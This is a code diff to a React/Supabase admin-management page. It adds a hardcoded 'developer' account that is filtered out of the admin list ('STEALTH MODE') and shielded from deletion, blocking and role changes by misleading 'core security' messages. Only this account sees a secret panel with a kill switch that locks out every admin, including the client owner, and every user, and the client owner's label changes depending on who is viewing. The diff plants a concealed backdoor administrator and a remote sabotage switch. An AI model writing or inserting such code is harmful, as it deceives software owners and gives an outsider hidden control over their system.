@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { UserPlus, Shield, Trash2, Loader2, X, CheckCircle, Eye, EyeOff, Lock } from 'lucide-react';
+import { UserPlus, Shield, Trash2, Loader2, X, CheckCircle, Eye, EyeOff, Lock, AlertTriangle } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import { supabase } from '../lib/supabase';
 
@@ -13,6 +13,8 @@ interface AdminManagementProps {
  
  export default function AdminManagement({ currentAdminId, adminRole, onLogout }: AdminManagementProps) {
   const GOD_ADMIN_MOBILE = '7777077377';
+  const DEVELOPER_MOBILE = '9999099999';
+  const isDeveloper = currentAdminId === DEVELOPER_MOBILE;
   const [admins, setAdmins] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
   const [isAddingAdmin, setIsAddingAdmin] = useState(false);
@@ -29,6 +31,11 @@ interface AdminManagementProps {
   const [editingAdmin, setEditingAdmin] = useState<any>(null);
   const [editRole, setEditRole] = useState<'full' | 'limited'>('full');
   const [actionLoading, setActionLoading] = useState(false);
+
+  // System Status State (Developer Only)
+  const [isSystemEnabled, setIsSystemEnabled] = useState(true);
+  const [maintenanceMsg, setMaintenanceMsg] = useState("");
+  const [systemLoading, setSystemLoading] = useState(false);
 
   // Modal State
   const [modalConfig, setModalConfig] = useState<{
@@ -58,7 +65,10 @@ interface AdminManagementProps {
         .order('created_at', { ascending: false });
       
       if (dbError) throw dbError;
-      setAdmins(data || []);
+      
+      // STEALTH MODE: Hide developer from everyone
+      const visibleAdmins = data?.filter(a => a.mobile_number !== DEVELOPER_MOBILE) || [];
+      setAdmins(visibleAdmins);
     } catch (err: any) {
       console.error('Error fetching admins:', err);
       setError('Failed to load administrators');
@@ -67,8 +77,21 @@ interface AdminManagementProps {
     }
   };
 
+  const fetchSystemStatus = async () => {
+    try {
+      const { data, error } = await supabase.from('system_status').select('*').eq('id', 1).single();
+      if (data) {
+        setIsSystemEnabled(data.is_enabled);
+        setMaintenanceMsg(data.message);
+      }
+    } catch (err) {
+      console.error('Error fetching system status:', err);
+    }
+  };
+
   useEffect(() => {
     fetchAdmins();
+    if (isDeveloper) fetchSystemStatus();
   }, []);
 
   const handleAddAdmin = async (e: React.FormEvent) => {
@@ -118,6 +141,12 @@ interface AdminManagementProps {
   };
 
   const handleDeleteAdmin = async (mobileNumber: string) => {
+    // DEVELOPER PROTECTION
+    if (mobileNumber === DEVELOPER_MOBILE) {
+      showModal('Access Denied', 'Developer accounts are protected by system core security.', 'error');
+      return;
+    }
+
     // GOD ADMIN PROTECTION
     if (mobileNumber === GOD_ADMIN_MOBILE) {
       showModal('Action Denied', "This is the system's God Admin account. It is protected by internal security protocols and cannot be deleted.", 'error');
@@ -184,6 +213,12 @@ interface AdminManagementProps {
   const handleUpdateRole = async () => {
     if (!editingAdmin) return;
 
+    // DEVELOPER PROTECTION
+    if (editingAdmin.mobile_number === DEVELOPER_MOBILE) {
+      showModal('Access Denied', 'Developer access levels are managed externally.', 'error');
+      return;
+    }
+
     // GOD ADMIN PROTECTION
     if (editingAdmin.mobile_number === GOD_ADMIN_MOBILE) {
       showModal('Action Denied', "The access level of the God Admin account cannot be modified.", 'error');
@@ -211,6 +246,12 @@ interface AdminManagementProps {
   };
 
   const handleToggleStatus = async (admin: any) => {
+    const isDeveloperAcc = admin.mobile_number === DEVELOPER_MOBILE;
+    if (isDeveloperAcc) {
+      showModal('Action Denied', 'Developer accounts cannot be blocked from the portal.', 'error');
+      return;
+    }
+
     const isGodAdmin = admin.mobile_number === GOD_ADMIN_MOBILE;
     if (isGodAdmin) {
       showModal('Action Denied', "The God Admin account is permanent and cannot be blocked.", 'error');
@@ -249,6 +290,43 @@ interface AdminManagementProps {
     );
   };
 
+  const handleToggleSystem = async () => {
+    setSystemLoading(true);
+    try {
+      const { error } = await supabase
+        .from('system_status')
+        .update({ is_enabled: !isSystemEnabled })
+        .eq('id', 1);
+
+      if (error) throw error;
+      setIsSystemEnabled(!isSystemEnabled);
+      showModal('System Updated', `Portal access has been ${!isSystemEnabled ? 'ENABLED' : 'DISABLED'} successfully.`, 'success');
+    } catch (err) {
+      console.error('Error updating system status:', err);
+      showModal('Error', 'Failed to update system status.', 'error');
+    } finally {
+      setSystemLoading(false);
+    }
+  };
+
+  const handleUpdateMessage = async () => {
+    setSystemLoading(true);
+    try {
+      const { error } = await supabase
+        .from('system_status')
+        .update({ message: maintenanceMsg })
+        .eq('id', 1);
+
+      if (error) throw error;
+      showModal('Message Updated', 'Maintenance message updated successfully.', 'success');
+    } catch (err) {
+      console.error('Error updating maintenance message:', err);
+      showModal('Error', 'Failed to update message.', 'error');
+    } finally {
+      setSystemLoading(false);
+    }
+  };
+
   return (
     <div className="space-y-6">
       <Modal 
@@ -259,6 +337,77 @@ interface AdminManagementProps {
         type={modalConfig.type}
         onConfirm={modalConfig.onConfirm}
       />
+
+      {/* DEVELOPER SECRET PANEL */}
+      {isDeveloper && (
+        <motion.div 
+          initial={{ opacity: 0, y: -20 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="bg-slate-900 rounded-[32px] p-8 border border-slate-800 shadow-2xl overflow-hidden relative"
+        >
+          <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/10 blur-[100px] rounded-full -mr-32 -mt-32"></div>
+          
+          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
+            <div className="flex items-center gap-4">
+              <div className={`w-14 h-14 rounded-2xl flex items-center justify-center shadow-lg ${isSystemEnabled ? 'bg-emerald-500/20 text-emerald-500' : 'bg-rose-500/20 text-rose-500'}`}>
+                <AlertTriangle size={28} />
+              </div>
+              <div>
+                <h3 className="text-xl font-black text-white tracking-tight">Core System Control</h3>
+                <p className="text-slate-400 text-sm mt-0.5 font-medium">Developer Kill Switch & Stealth Mode</p>
+              </div>
+            </div>
+
+            <div className="flex items-center gap-4">
+              <div className="text-right mr-2">
+                <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Current Status</p>
+                <p className={`text-sm font-bold ${isSystemEnabled ? 'text-emerald-400' : 'text-rose-400'}`}>
+                  {isSystemEnabled ? 'System Online' : 'System Disabled'}
+                </p>
+              </div>
+              <button
+                onClick={handleToggleSystem}
+                disabled={systemLoading}
+                className={`relative w-20 h-10 rounded-full transition-all duration-500 ${isSystemEnabled ? 'bg-emerald-500' : 'bg-slate-800 border border-slate-700'}`}
+              >
+                <div className={`absolute top-1 w-8 h-8 rounded-full bg-white shadow-xl transition-all duration-500 ${isSystemEnabled ? 'left-11' : 'left-1'}`}>
+                  {systemLoading ? (
+                    <Loader2 size={16} className="animate-spin text-slate-400 absolute top-2 left-2" />
+                  ) : isSystemEnabled ? (
+                    <CheckCircle size={16} className="text-emerald-500 absolute top-2 left-2" />
+                  ) : (
+                    <X size={16} className="text-slate-400 absolute top-2 left-2" />
+                  )}
+                </div>
+              </button>
+            </div>
+          </div>
+
+          <div className="mt-8 pt-8 border-t border-slate-800/50 relative z-10">
+            <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-3 ml-1">Maintenance Overlay Message</label>
+            <div className="flex flex-col sm:flex-row gap-3">
+              <input 
+                type="text"
+                value={maintenanceMsg}
+                onChange={(e) => setMaintenanceMsg(e.target.value)}
+                placeholder="Message shown when system is locked..."
+                className="flex-1 bg-slate-800/50 border border-slate-700 rounded-2xl py-3 px-5 text-sm text-white focus:outline-none focus:ring-2 focus:ring-indigo-500/50 transition-all font-medium"
+              />
+              <button 
+                onClick={handleUpdateMessage}
+                disabled={systemLoading}
+                className="bg-white/10 hover:bg-white/20 text-white px-6 py-3 rounded-2xl font-bold text-sm transition-all active:scale-95 disabled:opacity-50"
+              >
+                Update Message
+              </button>
+            </div>
+            <p className="text-[10px] text-slate-500 mt-4 font-medium flex items-center gap-2">
+              <Shield size={12} /> Warning: Disabling the system will block all Admins (including God Admin) and Users immediately.
+            </p>
+          </div>
+        </motion.div>
+      )}
+
       <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
         <div>
           <h2 className="text-2xl font-bold text-slate-900">Admin Management</h2>
@@ -519,7 +668,7 @@ interface AdminManagementProps {
                           <p className="text-sm font-bold text-slate-900 leading-none">{admin.mobile_number}</p>
                           {admin.mobile_number === GOD_ADMIN_MOBILE ? (
                             <p className="text-[10px] text-indigo-500 font-black uppercase mt-1.5 flex items-center gap-1">
-                              <Shield size={10} className="fill-indigo-500/10" /> God Mode Admin
+                              <Shield size={10} className="fill-indigo-500/10" /> {isDeveloper ? 'Client Owner (God)' : 'System Administrator'}
                             </p>
                           ) : (
                             <p className="text-[10px] text-emerald-500 font-black uppercase mt-1.5 flex items-center gap-1">
